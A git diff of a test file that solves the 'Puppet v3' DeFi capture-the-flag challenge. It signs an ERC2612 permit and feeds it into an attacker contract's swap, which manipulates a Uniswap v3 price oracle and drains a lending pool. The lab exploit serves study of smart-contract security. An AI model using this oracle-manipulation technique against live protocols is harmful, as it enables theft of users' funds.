@@ -146,15 +146,31 @@ describe('[Challenge] Puppet v3', function () {
         
         // Transfer all our token balance to our hacker contract
         await token.connect(player).transfer(hackPuppetv3.address, PLAYER_INITIAL_TOKEN_BALANCE);
+       
+        // Take advantage of new ERC2612 new form of approve without the need of sending a transaction
+        // Use eth-permit library to sign a permit for our HackPuppetV3 contract
+        const result = await signERC2612Permit(
+            player,
+            token.address,
+            player.address,
+            hackPuppetv3.address,
+            ethers.utils.parseUnits('110', 'ether')
+        );
+
         // Trigger the swap function of our hacker contract
         // Pass the encodePriceSqrt with a of 1 to 1000000
         // Sqrt is the max price difference we allow and
         // That's the price difference we're going to generate making the swap
+        // And include the data needed to make a permit
         await hackPuppetv3.connect(player).swap(
             uniswapPool.address,
             token.address,
             PLAYER_INITIAL_TOKEN_BALANCE,
-            encodePriceSqrt(1, LENDING_POOL_INITIAL_TOKEN_BALANCE)
+            encodePriceSqrt(1, LENDING_POOL_INITIAL_TOKEN_BALANCE),
+            result.deadline,
+            result.v,
+            result.r,
+            result.s
         );
         // Increse time because the price change lates ten minutes in fully make effect
         await time.increase(111);
@@ -173,7 +189,7 @@ describe('[Challenge] Puppet v3', function () {
         // Block timestamp must not have changed too much
         expect(
             (await ethers.provider.getBlock('latest')).timestamp - initialBlockTimestamp
-        ).to.be.lt(116, 'Too much time passed');
+        ).to.be.lt(115, 'Too much time passed');
 
         // Player has taken all tokens out of the pool        
         expect(
